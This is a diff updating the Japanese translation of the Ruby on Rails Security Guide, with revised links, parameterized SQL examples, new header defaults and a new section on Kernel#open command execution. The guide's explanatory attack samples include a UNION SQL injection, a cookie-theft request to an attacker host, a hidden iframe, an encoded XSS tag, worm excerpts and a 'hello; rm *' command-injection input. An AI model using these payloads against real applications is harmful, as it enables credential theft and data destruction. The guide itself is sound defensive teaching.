@@ -1,3 +1,5 @@
+**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON https://guides.rubyonrails.org.**
+
 Rails セキュリティガイド
 ============================
 
@@ -63,7 +65,7 @@ WARNING: **ユーザーのセッションIDが盗まれると、攻撃者がそ�
 
 * 攻撃者が自分の知らないcookieをわざわざ盗み取る代りに、自分が知っているcookieのセッションidを固定してしまうという攻撃方法もあります。詳細については後述のセッション固定に関する記述を参照してください。
 
-たいていの場合、攻撃者の目的は金儲けです。[Symantec Global Internet Security Threat Report(2017)](https://www.symantec.com/content/dam/symantec/docs/reports/istr-22-2017-en.pdf)によると、盗まれた銀行口座アカウントの闇価格は、口座残高の0.5~10%、クレジットカード番号は0.5ドルから30ドル(詳細情報を含むと20ドルから60ドル)、ID(名前、SSN、DOB)は0.1ドルから1.5ドル、小売店のアカウントは20ドルから50ドル、クラウドサービスプロバイダーのアカウントは6ドルから10ドルとなっています。
+たいていの場合、攻撃者の目的は金儲けです。[Symantec Global Internet Security Threat Report (2017)](https://docs.broadcom.com/docs/istr-22-2017-en)によると、盗まれた銀行口座アカウントの闇価格は、口座残高の0.5~10%、クレジットカード番号は0.5ドルから30ドル(詳細情報を含むと20ドルから60ドル)、ID(名前、SSN、DOB)は0.1ドルから1.5ドル、小売店のアカウントは20ドルから50ドル、クラウドサービスプロバイダーのアカウントは6ドルから10ドルとなっています。
 
 ### セッションストレージ
 
@@ -174,16 +176,12 @@ reset_session
 
 NOTE: **セッションを無期限にすると、攻撃される機会を増やしてしまいます (クロスサイトリクエストフォージェリ (CSRF)、セッションハイジャック、セッション固定など)。**
 
-セッションIDを持つcookieのタイムスタンプに有効期限を設定するという対応策も考えられなくはありません。しかし、ブラウザ内に保存されているcookieをユーザーが編集できてしまう点は変わらないので、やはりサーバー側でセッションを期限切れにする方が安全です。 **データベーステーブルのセッションを期限切れにする**には、たとえば次のように`Session.sweep("20 minutes")`を呼ぶと、20分以上経過したセッションが期限切れになります。
+セッションIDを持つcookieのタイムスタンプに有効期限を設定するという対応策も考えられなくはありません。しかし、ブラウザ内に保存されているcookieをユーザーが編集できてしまう点は変わらないので、やはりサーバー側でセッションを期限切れにする方が安全です。 **データベーステーブルのセッションを期限切れにする**には、たとえば次のように`Session.sweep("20.minutes")`を呼ぶと、20分以上経過したセッションが期限切れになります。
 
 ```ruby
 class Session < ApplicationRecord
   def self.sweep(time = 1.hour)
-    if time.is_a?(String)
-      time = time.split.inject { |count, unit| count.to_i.send(unit) }
-    end
-
-    delete_all "updated_at < '#{time.ago.to_s(:db)}'"
+    where("updated_at < ?", time.ago.to_formatted_s(:db)).delete_all
   end
 end
 ```
@@ -191,8 +189,7 @@ end
 この節では、セッション保持の問題のところで触れたセッション固定攻撃について説明します。攻撃者が5分おきにセッションを維持すると、サーバー側でセッションを期限切れにしようとしてもセッションを恒久的に継続させることができてしまいます。これに対する単純な対策は、セッションテーブルに`created_at`カラムを追加することです。これで、期限を過ぎたセッションを削除できます。上の`sweep`メソッドで以下のコードを使います。
 
 ```ruby
-delete_all "updated_at < '#{time.ago.to_s(:db)}' OR
-  created_at < '#{2.days.ago.to_s(:db)}'"
+where("updated_at < ? OR created_at < ?", time.ago.to_formatted_s(:db), 2.days.ago.to_formatted_s(:db)).delete_all
 ```
 
 クロスサイトリクエストフォージェリ (CSRF)
@@ -200,7 +197,7 @@ delete_all "updated_at < '#{time.ago.to_s(:db)}' OR
 
 この攻撃方法は、ユーザーによる認証が完了したと考えられるWebアプリケーションのページに、悪意のあるコードやリンクを仕込むというものです。そのWebアプリケーションへのセッションがタイムアウトしていなければ、攻撃者は本来認証されていないはずのコマンドを実行できてしまいます。
 
-![](images/csrf.png)
+![クロスサイトリクエストフォージェリ](images/security/csrf.png)
 
 <a href="#セッション">セッション</a>の章で、多くのRailsアプリケーションがcookieベースのセッションを使っていることを説明しました。このとき、セッションIDをcookieに保存してサーバー側にセッションハッシュを持つか、すべてのセッションハッシュをクライアント (ブラウザ) 側に持ちます。どちらの場合にも、ブラウザはリクエストのたびにcookieを自動的にドメインに送信します (そのドメインで利用できるcookieがある場合)。ここで問題となるのは、異なるドメインに属するサイトからリクエストがあった場合にもブラウザがcookieを送信してしまうという点です。以下の例で考えてみましょう。
 
@@ -300,7 +297,7 @@ end
 http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
 ```
 
-URLの末尾にあるホスト鍵は気付かれにくく、ユーザーは attacker.com ホストにリダイレクトされてしまいます。単純な対応策としては、**legacyアクションでは想定されたパラメータだけを含めるようにする**という方法があります (これは許可リスト的アプローチであり、想定されていないパラメータを除外する方法とは真逆です)。 **URLをリダイレクトする場合は、許可リストまたは正規表現でチェックしてください**。
+URLの末尾にあるホスト鍵は気付かれにくく、ユーザーは attacker.com ホストにリダイレクトされてしまいます。一般に、ユーザー入力をそのまま`redirect_to`に渡すことは危険であると考えられます。単純な対応策としては、**legacyアクションでは想定されたパラメータだけを含めるようにする**という方法があります (これは許可リスト的アプローチであり、想定されていないパラメータを除外する方法とは真逆です)。 **URLをリダイレクトする場合は、許可リストまたは正規表現でチェックしてください**。
 
 #### 自己完結型XSS
 
@@ -331,7 +328,7 @@ def sanitize_filename(filename)
 end
 ```
 
-(attachment_fuプラグインが画像に対して行なうように) ファイルのアップロードを同期的に行なうと、セキュリティ上かなり不利になります。**サービス拒否 (DoS) 攻撃の脆弱性**が生じるためです。攻撃者は、同期的に行われる画像ファイルアップロードを多数のコンピュータから同時に実行することで、サーバーに高負荷をかけて最終的にサーバーをクラッシュまたは動作停止に陥らせます。
+（`attachment_fu`プラグインが画像に対して行なうように）ファイルのアップロードを同期的に行なうと、セキュリティ上かなり不利になります。**サービス拒否 (DoS) 攻撃の脆弱性**が生じるためです。攻撃者は、同期的に行われる画像ファイルアップロードを多数のコンピュータから同時に実行することで、サーバーに高負荷をかけて最終的にサーバーをクラッシュまたは動作停止に陥らせます。
 
 これに対する最善のソリューションは、**メディアファイルを非同期的に処理すること**です。メディアファイルを保存し、その後データベース内への処理のリクエストをスケジューリングします。2番目の処理は、バックグラウンドで行います。
 
@@ -363,7 +360,7 @@ raise if basename !=
 send_file filename, disposition: 'inline'
 ```
 
-その他に、ファイル名をデータベースに保存しておき、データベースのidをサーバーのディスク上に置く実際のファイル名の代りに使う方法も併用できます。この方法も、アップロードファイルが実行される可能性を回避する方法として優れています。attachment_fuプラグインでも同様の手法が採用されています。
+その他に、ファイル名をデータベースに保存しておき、データベースのidをサーバーのディスク上に置く実際のファイル名の代りに使う方法も併用できます。この方法も、アップロードファイルが実行される可能性を回避する方法として優れています。`attachment_fu`プラグインでも同様の手法が採用されています。
 
 イントラネットとAdminのセキュリティ
 ---------------------------
@@ -403,28 +400,7 @@ Google Adsenseのメールアドレスとパスワードが変更された事例
 
 NOTE: **認証 (authentication) と認可 (authorization) はほぼすべてのWebアプリケーションにおいて不可欠です。認証システムは自前で作るよりも、広く使われているプラグイン (訳注: 現在ならgem) を使うことをお勧めします。ただし、常に最新の状態にアップデートするようにしてください。この他にいくつかの注意を守ることで、アプリケーションをよりセキュアにすることができます。**
 
-Railsでは多数の認証用プラグインを利用できます。人気の高い[devise](https://github.com/plataformatec/devise) や[authlogic](https://github.com/binarylogic/authlogic)などの優れたプラグインは、パスワードを平文ではなく常に暗号化した状態で保存します。Rails 3.1では、同様の機能を持つビルトインの`has_secure_password`メソッドを使えます。
-
-新規ユーザーは必ずメール経由でアクティベーションコードを受け取り、メール内のリンク先でアカウントを有効にするようになっています。アカウントが有効になると、データベース上のアクティベーションコードのカラムはNULLに設定されます。以下のようなURLをリクエストするユーザーは、データベースで見つかる最初に有効になったユーザーとしてWebサイトにログインできてしまう可能性があります。そしてそれがたまたま管理者である可能性もありえます。
-
-```
-http://localhost:3006/user/activate
-http://localhost:3006/user/activate?id=
-```
-
-一部のサーバーでは、`params[:id]`で参照されるパラメータidがnilになってしまっていることがあるので、上のURLが通用してしまう可能性があります。アクティベーション操作中にこのことが敵に突き止められるまでの流れは以下のとおりです。
-
-```ruby
-User.find_by_activation_code(params[:id])
-```
-
-パラメータがnilの場合、以下のSQLが生成されます。
-
-```sql
-SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
-```
-
-この結果、データベースに実在する最初のユーザーが検索で見つかり、結果が返されてログインされてしまいます。詳しくは[筆者のブログ記事](http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/)を参照してください。**プラグインは、機会を見てアップデートすることをお勧めします**。さらに、Webアプリケーションにこのような欠陥がないかどうか見直しをかけてください。
+Railsでは多数の認証用プラグインを利用できます。人気の高い[devise](https://github.com/plataformatec/devise) や[authlogic](https://github.com/binarylogic/authlogic)などの優れたプラグインは、パスワードを平文ではなく常に暗号化した状態で保存します。Rails 3.1以降は、セキュアなパスワードハッシュ化・確認・復旧メカニズムをサポートするビルトインの`has_secure_password`メソッドも利用できます。
 
 ### アカウントに対する総当たり攻撃
 
@@ -466,7 +442,7 @@ CAPTCHAの問題は、ユーザーエクスペリエンスを多少損ねるこ�
 
 ほとんどのボットは、単にWebページをクロールしてフォームを見つけてはスパム文を入力するだけのお粗末なものです。ネガティブCAPTCHAではこれを逆手に取り、フォームに「ハニーポット」フィールドを置いておきます。これは、CSSやJavaScriptを用いて人間には表示されないように設定されたダミーのフィールドです。
 
-ネガティブCAPTCHAが効果を発揮するのはWebをクロールする自動ボットからの保護のみであり、重要なサイトに狙いを定めるボットを防ぐのには不向きです。しかしネガティブCAPTCHAとポジティブCAPTCHAをうまく組み合わせればパフォーマンスを改善できることがあります。たとえば「ハニーポット」フィールドに何か入力された（=ボットが検出された）場合はポジティブCAPTCHAの検証は不要になり、レスポンス処理の前にGoogle ReCapchaにHTTPSリクエストを送信せずに済みます。
+ネガティブCAPTCHAが効果を発揮するのはWebをクロールする素朴な自動ボットからの保護のみであり、重要なサイトに狙いを定めるボットを防ぐのには不向きです。しかしネガティブCAPTCHAとポジティブCAPTCHAをうまく組み合わせればパフォーマンスを改善できることがあります。たとえば「ハニーポット」フィールドに何か入力された（=ボットが検出された）場合はポジティブCAPTCHAの検証は不要になり、レスポンス処理の前にGoogle ReCapchaにHTTPSリクエストを送信せずに済みます。
 
 JavaScriptやCSSを用いてハニーポットフィールドを人間から隠す方法をいくつかご紹介します。
 
@@ -635,27 +611,36 @@ SELECT * FROM projects WHERE (name = '') UNION
   SELECT id,login AS name,password AS description,1,1,1 FROM users --'
 ```
 
-このクエリで得られるのはプロジェクトのリストではなく(名前が空欄のプロジェクトはないので)、ユーザー名とパスワードのリストです。データベース上のパスワードが暗号化されていればまだ最悪の事態は避けられます。一方、攻撃者にとっての問題は、両方のクエリでカラムの数を同じにしなければならないことだけです。この攻撃用文字列では、そのために2番目のクエリに「1」を連続して配置しています。これらの値は常に1になるので、1番目のクエリのカラム数と一致します。
+このクエリで得られるのはプロジェクトのリストではなく(名前が空欄のプロジェクトはないので)、ユーザー名とパスワードのリストです。[パスワードをセキュアな方法でハッシュ化](#ユーザー管理)していればまだ最悪の事態は避けられます。一方、攻撃者にとっての問題は、両方のクエリでカラムの数を同じにしなければならないことだけです。この攻撃用文字列では、そのために2番目のクエリに「1」を連続して配置しています。これらの値は常に1になるので、1番目のクエリのカラム数と一致します。
 
-同様に、2番目のクエリではカラム名をASでリネームしています。これにより、ユーザーテーブルから取り出した値がWebアプリケーション上で表示されます。Railsを[最低でも2.1.1にアップデート](http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/)してください。
+同様に、2番目のクエリではカラム名をASでリネームしています。これにより、ユーザーテーブルから取り出した値がWebアプリケーション上で表示されます。Railsを[最低でも2.1.1にアップデート](https://rorsecurity.info/journal/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter.html)してください。
 
 #### 対応策
 
 Ruby on Railsには、特殊なSQL文字をフィルタが組み込まれており、「`'`」「`"`」「NULL」「改行」をエスケープします。**`Model.find(id)`や`Model.find_by_なんちゃら(かんちゃら)`といったクエリでは自動的にこの対応策が適用されます**。ただし、SQLフラグメント、特に**条件フラグメント (`where("...")`)、`connection.execute()`または`Model.find_by_sql()`メソッド**については手動でエスケープする必要があります。
 
-条件オプションに文字列を直接渡す代りに、以下のように配列を渡すことで、汚染された文字列をサニタイズすることもできます。
+条件オプションに文字列を直接渡す代りに、以下のように位置指定ハンドラを使うことで、汚染された文字列をサニタイズできます。
 
 ```ruby
-Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
+Model.where("zip_code = ? AND quantity >= ?", entered_zip_code, entered_quantity).first
 ```
 
-上に示したように、配列の最初の部分がSQLフラグメントになっており、その中に疑問符「`?`」が含まれています。サニタイズされた変数は、配列の後半に置かれており、フラグメント内の疑問符を置き換えます。ハッシュを渡して同じ結果を得ることもできます。
+第1パラメータでは、SQLクエリの断片に疑問符`?`が2つ含まれています。2つの疑問符`?`は、第2と第3パラメータの変数の値でそれぞれ置き換えられます。
+
+以下のように名前付きハンドラを用いて、ハッシュから値を取り出すこともできます。
 
 ```ruby
-Model.where(login: entered_user_name, password: entered_password).first
+values = { zip: entered_zip_code, qty: entered_quantity }
+Model.where("zip_code = :zip AND quantity >= :qty", values).first
 ```
 
-モデルのインスタンスでは、配列またはハッシュのみを利用できます。それ以外の場所では`sanitize_sql()`を使うのもよいでしょう。**SQLで外部の文字列をサニタイズせずに使うと、セキュリティ上重大な結果がもたらされる可能性があることに普段から注意する習慣をつけましょう**。
+さらに、ユースケースに応じて有効な条件を分割したうえでチェインすることも可能です。
+
+```ruby
+Model.where(zip_code: entered_zip_code).where("quantity >= ?", entered_quantity).first
+```
+
+上の対応方法は、モデルのインスタンスでしか利用できない点にご注意ください。それ以外の場所では`sanitize_sql()`をお試しください。**SQLで外部から入力された文字列を使うときは、常にセキュリティ上の影響を考える習慣を付けましょう**
 
 ### クロスサイトスクリプティング (XSS)
 
@@ -669,7 +654,7 @@ INFO: **XSSは最も発生しやすいWebセキュリティ上の脆弱性であ
 
 XSS攻撃は次のように行われます。攻撃者が何らかのコードをWebアプリケーションに注入し、後に標的ユーザーのWebページ上に表示されます。XSS事例の多くは警告ボックスを表示する程度のものですが、実際はもっと凶悪です。XSSを使うことで、cookieの盗み出し、セッションのハイジャック、標的ユーザーを偽のWebサイトに誘い込む、攻撃者の利益になるような広告を表示する、Webサイトの要素を書き換えてユーザー情報を盗み出す、あるいはWebブラウザのセキュリティ・ホールを経由して邪悪なソフトウェアをインストールすることもできます。
 
-2007年後半、Mozillaブラウザで88の脆弱性、Safariで22、IEで18、Operaで12の脆弱性が報告されました。[Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf) には、2007年後半にブラウザのプラグインで239の脆弱性が報告されています。[Mpack](http://pandalabs.pandasecurity.com/mpack-uncovered/)は大変活発かつ最新の攻撃用フレームワークであり、これらの脆弱性を利用しています。犯罪的なハッカーにとって、WebアプリケーションフレームワークのSQLインジェクションの脆弱性につけ込み、テキストテーブルのカラムに凶悪なコードを注入して回るのはたまらない魅力です。2008年4月には、510,000以上のWebサイトがこの方法でハッキングされ、英国政府、国連など多くの重要なサイトが被害に遭いました。
+2007年後半、Mozillaブラウザで88の脆弱性、Safariで22、IEで18、Operaで12の脆弱性が報告されました。[Symantec Global Internet Security threat report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf) には、2007年後半にブラウザのプラグインで239の脆弱性が報告されています。[Mpack](https://www.pandasecurity.com/en/mediacenter/malware/mpack-uncovered/)は大変活発かつ最新の攻撃用フレームワークであり、これらの脆弱性を利用しています。犯罪的なハッカーにとって、WebアプリケーションフレームワークのSQLインジェクションの脆弱性につけ込み、テキストテーブルのカラムに凶悪なコードを注入して回るのはたまらない魅力です。2008年4月には、510,000以上のWebサイトがこの方法でハッキングされ、英国政府、国連など多くの重要なサイトが被害に遭いました。
 
 #### HTML/JavaScriptインジェクション
 
@@ -708,11 +693,11 @@ www.attacker.com サイト上のログファイルには以下のように記録
 GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
 ```
 
-この攻撃をある程度緩和するためには[httpOnly](http://dev.rubyonrails.org/ticket/8895)フラグをcookieに追加します。これにより、`document.cookie`をJavaScriptで読み出せなくなります。HTTP only cookieはIE v6.SP1、Firefox v2.0.0.5、Opera 9.5以降で利用できます。Safariはまだこのフラグを検討中であり、このオプションは無視されます。ただしWebTVやMac版IE 5.5などの古いブラウザでは、ページ上での読み込みに失敗します。なお、[Ajaxを使うとcookieが表示可能になる](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/)ことにもご注意ください。
+この攻撃をある程度緩和するためには`httpOnly`フラグを明示的にcookieに追加します。これにより、`document.cookie`をJavaScriptで読み出せなくなります。HTTP only cookieはIE v6.SP1、Firefox v2.0.0.5、Opera 9.5、Safari 4、Chrome 1.0.154以降で利用できます。ただしWebTVやMac版IE 5.5などの古いブラウザでは、ページ上での読み込みに失敗します。なお、[Ajaxを使うとcookieが表示可能になる](https://owasp.org/www-community/HttpOnly#browsers-supporting-httponly)ことにもご注意ください。
 
 ##### Webページの汚損
 
-Webページを書き換える (汚損) ことで、偽の情報を表示したり、標的ユーザーを攻撃者の偽サイトに誘い込んでcookieやログイン情報などの重要データを盗み出すなどのさまざまな攻撃が可能になります。最も多い攻撃は、iframeタグを悪用して外部のコードをWebページに含める方法です。
+Webページを書き換える（汚損）ことで、偽の情報を表示したり、標的ユーザーを攻撃者の偽サイトに誘い込んでcookieやログイン情報などの重要データを盗み出すなどのさまざまな攻撃が可能になります。最も多い攻撃は、以下のように`iframe`タグを悪用して外部のコードをWebページに含める方法です。
 
 ```html
 <iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
@@ -756,8 +741,8 @@ s = sanitize(user_input, tags: tags, attributes: %w(href title))
 
 従来のネットワークトラフィックは西欧文化圏のアルファベットがほとんどでしたが、それ以外の言語を伝えるためにUnicodeなどの新しいエンコード方式が使われるようになってきました。しかしこれはWebアプリケーションにとっては新たな脅威となるかもしれません。異なるコードでエンコードされた中に、ブラウザでは処理可能だがサーバーでは処理されないような悪意のあるコードが潜んでいるかもしれないからです。UTF-8による攻撃方法の例を以下に示します。
 
-```
-<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
+```html
+<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
   &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 ```
 
@@ -767,9 +752,9 @@ s = sanitize(user_input, tags: tags, attributes: %w(href title))
 
 **近年におけるWebアプリケーションへの攻撃を理解するには、実際の攻撃例を目にするのがベストです。**
 
-以下は[Js.Yamanner@m](http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&tabid=1) Yahoo! Mail [ワーム](http://groovin.net/stuff/yammer.txt) からの抜粋です。この攻撃は2006年6月11日に行われたもので、Webメールインターフェイスを利用したワームの最初の事例です。
+以下は[Js.Yamanner@m Yahoo! Mailワーム](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=12d8d106-1137-4d7c-8bb4-3ea1faec83fa)からの抜粋です。この攻撃は2006年6月11日に行われたもので、Webメールインターフェイスを利用したワームの最初の事例です。
 
-```
+```html
 <img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
   target=""onload="var http_request = false;    var Email = '';
   var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
@@ -816,7 +801,7 @@ alert(eval('document.body.inne' + 'rHTML'));
 
 最終的に4KBサイズのワームができあがり、作者は自分のプロファイルページにこれを注入しました。
 
-[moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html)というCSSプロパティは、FirefoxなどのGeckoベースのブラウザではCSS経由でJavaScriptを注入する手段に使われる可能性があることが判明しています。
+[moz-binding](https://www.mozilla.org/en-US/security/advisories/mfsa2008-57/)というCSSプロパティは、FirefoxなどのGeckoベースのブラウザではCSS経由でJavaScriptを注入する手段に使われる可能性があることが判明しています。
 
 #### 対応策
 
@@ -826,7 +811,7 @@ alert(eval('document.body.inne' + 'rHTML'));
 
 セキュリティ上の理由からHTML以外のテキストフォーマット機能を提供するのであれば、何らかのマークアップ言語を採用し、それをサーバー側でHTMLに変換するようにしてください。[RedCloth](http://redcloth.org/)はRuby用に開発されたマークアップ言語の一種ですが、注意して使わないとXSSに対しても脆弱になります。
 
-例を挙げます。RedClothは `_test_`というマークアップを`<em>test<em>`に変換します。この箇所のテキストはイタリックになります。しかし、執筆当時の最新バージョンである3.0.4までのRedClothはXSSに関しても脆弱でした。この重大なバグを取り除くには[最新のバージョン4](http://www.redcloth.org)を入手してください。しかし新しいバージョンでも[若干のセキュリティバグ](http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html)が見つかったので、対応策は未だに欠かせません。バージョン3.0.4の例を以下に示します。
+例を挙げます。RedClothは `_test_`というマークアップを`<em>test<em>`に変換します。この箇所のテキストはイタリックになります。しかし、執筆当時の最新バージョンである3.0.4までのRedClothはXSSに関しても脆弱でした。この重大なバグを取り除くには[最新のバージョン4](http://www.redcloth.org)を入手してください。しかし新しいバージョンでも[若干のセキュリティバグ](https://rorsecurity.info/journal/2008/10/13/new-redcloth-security.html)が見つかったので、対応策は未だに欠かせません。バージョン3.0.4の例を以下に示します。
 
 ```ruby
 RedCloth.new('<script>alert(1)</script>').to_html
@@ -861,7 +846,13 @@ NOTE: **Ajaxでも、通常のWebアプリケーション開発上で必要と�
 
 NOTE: **ユーザーが入力したデータをコマンドラインのオプションに使う場合は十分に注意してください。**
 
-Webアプリケーションが背後のOSコマンドを実行しなければならない場合、Rubyには`exec(コマンド)`、`syscall(コマンド)`、`system(コマンド)`、そしてバッククォート記法という方法が用意されています。特に、これらのコマンド全体または一部を入力できる可能性に注意が必要です。ほとんどのシェルでは、コマンドにセミコロン`;`や垂直バー`|`を追加して別のコマンドを簡単に結合できてしまいます。
+Webアプリケーションが背後のOSコマンドを実行しなければならない場合、Rubyには`exec(コマンド)`、`syscall(コマンド)`、`system(コマンド)`、そしてバッククォート記法（`` `command` ``）という方法が用意されています。特に、これらのコマンド全体または一部を入力できる可能性に注意が必要です。ほとんどのシェルでは、コマンドにセミコロン`;`や垂直バー`|`を追加して別のコマンドを簡単に結合できてしまいます。
+
+```ruby
+user_input = "hello; rm *"
+system("/bin/echo #{user_input}")
+# "hello"を出力してカレントディレクトリのファイルを削除する
+```
 
 対応策は、**コマンドラインのパラメータを安全に渡せる`system(コマンド, パラメータ)`メソッドを使うことです**。
 
@@ -870,6 +861,28 @@ system("/bin/echo","hello; rm *")
 # "hello; rm *"を実行してもファイルは削除されない
 ```
 
+#### `Kernel#open`の脆弱性
+
+`Kernel#open`に、垂直バー`|`で始まる引数を渡すとOSコマンドを実行できます。
+
+```ruby
+open('| ls') { |f| f.read }
+# lsコマンドのファイルリストをStringとして返す
+```
+
+対応策は、代わりに`File.open`、`IO.open`、`URI#open`を使うことです。これらはOSコマンドを実行しません。
+
+```ruby
+File.open('| ls') { |f| f.read }
+# lsコマンドは実行されず、単に`| ls`というファイルが存在すれば開く
+
+IO.open(0) { |f| f.read }
+# stdinをオープンするが、引数をStringとして受け取らない
+
+require 'open-uri'
+URI('https://example.com').open { |f| f.read }
+# URLを開く: `URI()`は`| ls`を受け取らない
+```
 
 ### ヘッダーインジェクション
 
@@ -969,7 +982,7 @@ Railsアプリケーションから受け取るすべてのHTTPレスポンス�
 ```ruby
 config.action_dispatch.default_headers = {
   'X-Frame-Options' => 'SAMEORIGIN',
-  'X-XSS-Protection' => '1; mode=block',
+  'X-XSS-Protection' => '0',
   'X-Content-Type-Options' => 'nosniff',
   'X-Download-Options' => 'noopen',
   'X-Permitted-Cross-Domain-Policies' => 'none',
@@ -995,9 +1008,9 @@ config.action_dispatch.default_headers.clear
 よく使われるヘッダーのリストを以下に示します。
 
 * `X-Frame-Options`: **Railsではデフォルトで`SAMEORIGIN`が指定されます**。このヘッダーは、同一ドメインでのフレーミングを許可します。'DENY'を指定するとすべてのフレーミングが不許可になります。すべてのWebサイトについてフレーミングを許可するには'ALLOWALL'を指定します。
-* `X-XSS-Protection`: **Railsではデフォルトで`1; mode=block`が指定されます**。XSS攻撃が検出された場合は、XSS Auditorとブロックページをお使いください。XSS Auditorをオフにしたい場合は'0;'を指定します(レスポンスがリクエストパラメータからのスクリプトを含んでいる場合に便利です)。
+* `X-XSS-Protection`: **Railsではデフォルトで`0`が指定されます**。これは[非推奨化されたレガシーヘッダー](https://owasp.org/www-project-secure-headers/#x-xss-protection)であり、問題のあるレガシーXSS監査を無効にするために`0`に設定してください。
 * `X-Content-Type-Options`: **Railsではデフォルトで`nosniff`が指定されます**。このヘッダーは、ブラウザがファイルのMIMEタイプを推測しないようにします。
-* `X-Content-Security-Policy`: このヘッダーは、[コンテンツタイプを読み込む元のサイトを制御するための強力なメカニズム](http://w3c.github.io/webappsec/specs/content-security-policy/csp-specification.dev.html)です。
+* `X-Content-Security-Policy`: このヘッダーは、[コンテンツタイプを読み込む元のサイトを制御するための強力なメカニズム](https://w3c.github.io/webappsec-csp/)です。
 * `Access-Control-Allow-Origin`: このヘッダーは、同一生成元ポリシーのバイパスとクロスオリジン(cross-origin)リクエストをサイトごとに許可します。
 * `Strict-Transport-Security`: このヘッダーは、[ブラウザからサイトへの接続をセキュアなものに限って許可するかどうかを指定します](https://ja.wikipedia.org/wiki/HTTP_Strict_Transport_Security)。
 
@@ -1111,15 +1124,20 @@ Railsはcredentialファイル`config/credentials.yml.enc`に秘密鍵を保存�
 
 credentialファイル内の秘密情報には`Rails.application.credentials`でアクセスできます。たとえば、復号した`config/credentials.yml.enc`ファイルに以下があるとします。
 
-    secret_key_base: 3b7cd727ee24e8444053437c36cc66c3
-    some_api_key: SOMEKEY
+```yaml
+secret_key_base: 3b7cd72...
+some_api_key: SOMEKEY
+system:
+  access_key_id: 1234AB
+```
 
-どの環境でも`Rails.application.credentials.some_api_key`から`SOMEKEY`が返されます。
+このとき`Rails.application.credentials.some_api_key`は`"SOMEKEY"`を返しますが、`Rails.application.credentials.system.access_key_id`は`"1234AB"`を返します。
 
-キーが空の場合に例外を発生させるには、`!`を付けます。
+キーが空白の場合に例外を発生させたい場合は、以下のように`!`付きのメソッドを使えます。
 
 ```ruby
-Rails.application.credentials.some_api_key! # => raises KeyError: :some_api_key is blank
+# some_api_keyが空白の場合...
+Rails.application.credentials.some_api_key! # => KeyError: :some_api_key is blank
 ```
 
 TIP: credentialについて詳しくは、`rails credentials:help`を参照してください。
@@ -1139,4 +1157,4 @@ WARNING: マスターキーは安全な場所に保管してください。マ�
 * Railsセキュリティ [メーリングリスト](https://groups.google.com/forum/#!forum/rubyonrails-security))を購読しましょう。
 * [Brakeman - Rails Security Scanner](https://brakemanscanner.org/) -- Railsアプリケーションの静的セキュリティ解析を行うgemです。
 * [アプリケーションのその他の層についても最新に保ってください](http://secunia.com/) (週刊のニュースレターも発行しています)。
-* ある[優れたセキュリティブログ](https://www.owasp.org)には[クロスサイトスクリプティングのチートシート](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md)が掲載されています。
+* OWASPの[優れたセキュリティブログ](https://owasp.org)には[クロスサイトスクリプティングのチートシート](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md)が掲載されています。
